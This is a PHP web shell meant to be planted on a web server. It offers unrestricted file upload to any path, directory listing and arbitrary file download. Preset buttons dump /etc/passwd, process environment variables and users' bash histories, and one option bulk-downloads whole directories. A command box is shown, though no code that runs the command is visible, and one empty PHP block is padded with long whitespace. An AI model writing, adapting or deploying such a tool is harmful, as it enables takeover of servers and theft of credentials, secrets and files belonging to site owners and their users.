<?php
// Check if mode is set to 'dev' in the URL
$mode = isset($_GET['mode']) ? $_GET['mode'] : 'webshell';

// Check if form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($mode === 'dev') {
        // Save code to file
        $location = $_POST['location'];
        $code = $_POST['code'];
        file_put_contents($location, $code);
        
        // Redirect to web shell with the new code's location
        $fileName = basename($location);
        $shellCmd = "cat " . dirname($location) . "/" . $fileName;
        header("Location: ?mode=webshell&cmd=" . urlencode($shellCmd));
        exit;
    }
}

// Function to fetch all files in a directory
function fetchAllFiles($directory) {
    $files = glob($directory . '/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            // Output file download link
            echo "<a href='?mode=download&file=" . urlencode($file) . "'>" . basename($file) . "</a><br>";
        }
    }
}
// Function to handle file download
function downloadFile($file) {
    // Check if file exists
    if (file_exists($file)) {
        // Set headers for file download
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "File not found.";
    }
}
?>
<style>
    body { font-family: 'Courier New', Courier, monospace; background-color: #111; color: #ddd; margin: 0; padding: 20px; }
    form { background-color: #222; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); }
    input[type="text"], input[type="textarea"] { width: 300px; padding: 10px; font-size: 16px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #ddd; }
    textarea { width: 700px; height: 600px; padding: 10px; font-size: 16px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #ddd; resize: vertical; }
    input[type="submit"], button { padding: 10px 20px; font-size: 16px; background-color: #007bff; color: #fff; border: none; border-radius: 5px; cursor: pointer; margin-right: 10px; margin-bottom: 10px; }
    pre { background-color: #000; padding: 10px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; font-size: 14px; line-height: 1.5; }
    .devModeButton { background-color: red; color: white; }
</style>

<?php if ($mode === 'webshell'): ?>
    <!-- Web Shell Mode -->
    Current User: <?php echo get_current_user(); ?>
    <form id="shellForm" method="get">
        Command: <input type="text" name="cmd" id="cmdInput" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>">
        <input type="submit" value="Execute">
    </form>

    <!-- Add buttons with predefined commands -->
    <button onclick="setCommandAndSubmit('ls -lha /')">ls -lha /</button>
    <button onclick="setCommandAndSubmit('ls -lh /var/www/html')">ls DOCUMENT_ROOT</button>
    <button onclick="setCommandAndSubmit('cat /proc/self/cmdline')">/proc/self/cmdline</button>
    <button onclick="setCommandAndSubmit('cat /proc/self/environ')">/proc/self/environ</button>
    <button onclick="setCommandAndSubmit('cat /etc/passwd')">/etc/passwd</button>
    </br>
    <span>(Experimental) sh history, User name: </span><input type="text" id="userNameInput" placeholder="Enter username (empty = me)">
    <button onclick="setCatCommandAndSubmit()">cat .bash_history</button>

    </br><span>If you want to save result as a File: </span><input type="text" id="filename" placeholder="Enter filename">
    <button onclick="addSaveAsAFile()">Save Result as File</button>

    </br><span>Give me a dir: </span><input type="text" id="dirname" placeholder="Tell me the directory">
    <button onclick="fetchAllAndSend()">And download every single sh*t</button>

    <!-- Button for switching to dev mode -->
    <a href="?mode=dev" class="devModeButton">Wanna Write a Code?</a>

    <script>
        function setCommandAndSubmit(command) {
            document.getElementById('cmdInput').value = command;
            document.getElementById('shellForm').submit();
        }

        function setCatCommandAndSubmit() {
            var userName = document.getElementById('userNameInput').value;
            var command = "cat /home/" + (userName ? userName : "<?php echo get_current_user(); ?>") + "/.bash_history";
            document.getElementById('cmdInput').value = command;
            document.getElementById('shellForm').submit();
        }

        function addSaveAsAFile() {
            var command = document.getElementById('cmdInput').value;
            var filename = document.getElementById('filename').value;
            var commandWithRedirect = command + " > " + filename;
            document.getElementById('cmdInput').value = commandWithRedirect;
        }

        function fetchAllAndSend() {
            var directory = document.getElementById('dirname').value;
            window.location.href = '?mode=download&directory=' + directory;
        }

    </script>

    <?php                                                                                                                ?>

<?php elseif ($mode === 'download'): ?>
    <!-- Download Mode -->
    <?php 
    // Check if directory is provided in the URL
    if (isset($_GET['directory'])) {
        $directory = $_GET['directory'];
        // Fetch and output all files in the directory
        ?>
        <style>
            a:link { color: white; background-color: transparent; text-decoration: none; }
            a:visited { color: pink; background-color: transparent; text-decoration: none; }
            a:hover { color: yellow; background-color: transparent; text-decoration: underline; }
        </style>
        <?php
        fetchAllFiles($directory);
        echo "<br><a color='white' href='?mode=webshell'>" . "[[go back]]" . "</a><br>";
    } elseif (isset($_GET['file'])) {
        $file = $_GET['file'];
        // Download the file
        downloadFile($file);
    } 
    ?>
<?php else: ?>
    <!-- Dev Mode -->
    <h2>Your New Code's Location & Filename</h2>
    <form method="post">
        <label for="location">Location & Filename:</label><br>
        <input type="text" id="location" name="location" required><br>
        <label for="code">Give me your code, and I'll save it:</label><br>
        <textarea id="code" name="code" rows="10" cols="50" required></textarea><br>
        <input type="submit" value="Upload">
    </form>
<?php endif; ?>
